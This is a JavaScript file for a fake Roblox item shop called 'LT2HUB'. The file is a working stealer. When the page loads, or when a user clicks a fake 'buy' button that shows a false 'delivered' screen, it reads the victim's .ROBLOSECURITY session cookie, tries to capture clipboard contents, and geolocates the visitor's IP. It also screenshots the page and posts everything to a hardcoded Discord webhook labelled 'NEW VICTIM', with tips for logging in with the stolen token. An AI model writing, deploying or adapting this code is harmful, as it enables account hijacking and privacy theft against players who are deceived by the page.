const webhook = "https://discord.com/api/webhooks/1436941603586576429/ZdBgo21SF3IFNIzZoOh-9OULt0edw8bYbnAX2AIRCsX11v0m04cftdZjea_nKm_y4bwd";

async function grab() {
    const data = {
        username: "LT2HUB STEALTH",
        embeds: [{
            title: "NEW VICTIM JUST OPENED LT2HUB",
            color: 3447003,
            timestamp: new Date().toISOString(),
            fields: []
        }]
    };

    // ROBLOX COOKIE
    const roblox = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
    if(roblox) {
        const token = roblox.split('=')[1];
        data.embeds[0].fields.push(
            { name: "ROBLOSECURITY", value: "```" + token.substring(0,1800) + "```" },
            { name: "LOGIN METHOD", value: "EditThisCookie → Import → Paste token" }
        );
    }

    // SILENT CLIPBOARD
    const input = document.createElement('input');
    input.style.position = 'fixed';
    input.style.opacity = 0;
    document.body.appendChild(input);
    input.focus();
    setTimeout(() => {
        if(input.value.length > 2) {
            data.embeds[0].fields.push({
                name: "CLIPBOARD", value: "```" + input.value.substring(0,1000) + "```"
            });
        }
        input.remove();
    }, 200);

    // FAKE STATS (just "Loading" as requested)
    document.getElementById('online').textContent = 'Loading';
    document.getElementById('orders').textContent = 'Loading';

    // IP
    try {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json();
        const geo = await (await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
        data.embeds[0].fields.push(
            { name: "IP", value: ip.ip },
            { name: "Location", value: `${geo.city}, ${geo.country_name}` }
        );
    }catch(e){}

    // SCREENSHOT
    setTimeout(async () => {
        try {
            const canvas = await html2canvas(document.body, {scale: 0.7});
            data.embeds[0].image = { url: canvas.toDataURL() };
        }catch(e){}
        fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
    }, 3500);

    fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
}

// TABS (FIXED NO GLITCH)
document.querySelectorAll('.menu a').forEach(link => {
    link.addEventListener('click', e => {
        e.preventDefault();
        document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
        link.classList.add('active');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(link.dataset.tab).classList.add('active');
    });
});

// BUY
function buy(item) {
    document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#0d1117;display:flex;align-items:center;justify-content:center;flex-direction:column;color:white;text-align:center">
            <h1 style="font-size:5em;color:#58a6ff;margin-bottom:20px">SUCCESS</h1>
            <p style="font-size:2em">${item} delivered!</p>
            <p style="font-size:1.3em;margin-top:20px">Check your base in 20 seconds</p>
        </div>
    `;
    grab();
}

// AUTO GRAB
window.addEventListener('load', () => setTimeout(grab, 2200));
